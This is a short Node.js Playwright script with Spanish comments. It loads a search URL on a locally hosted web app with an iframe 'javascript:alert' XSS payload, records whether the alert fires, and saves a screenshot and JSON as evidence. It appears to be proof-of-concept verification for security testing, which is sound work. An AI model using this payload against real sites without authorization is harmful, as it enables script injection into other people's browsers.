// Abre /#/search?q=<payload> en Chromium y confirma que el alert XSS se ejecuta.
// Requiere Playwright vía PLAYWRIGHT_DIR (instalación aislada, no es dependencia del proyecto).
const path=require('path');
const { chromium } = require(path.join(process.env.PLAYWRIGHT_DIR,'node_modules','playwright'));
(async()=>{
  const base=process.env.BASE_URL||'http://127.0.0.1:3000';
  const evid=process.env.EVID||'.';
  const payload='<iframe src="javascript:alert(`xss`)">';
  const url=base+'/#/search?q='+encodeURIComponent(payload);
  const browser=await chromium.launch();
  const page=await browser.newPage();
  let fired=false,msg=null;
  page.on('dialog',async d=>{fired=true;msg=d.message();await d.dismiss();});
  await page.goto(url,{waitUntil:'domcontentloaded'}).catch(()=>{});
  await page.waitForTimeout(2500);
  await page.screenshot({path:path.join(evid,'xss-ejecutado.png')}).catch(()=>{});
  require('fs').writeFileSync(path.join(evid,'resultado.json'),JSON.stringify({url,payload,dialogFired:fired,dialogMessage:msg},null,2));
  console.log('dialogFired='+fired+' msg='+JSON.stringify(msg));
  await browser.close(); process.exit(fired?0:2);
})();
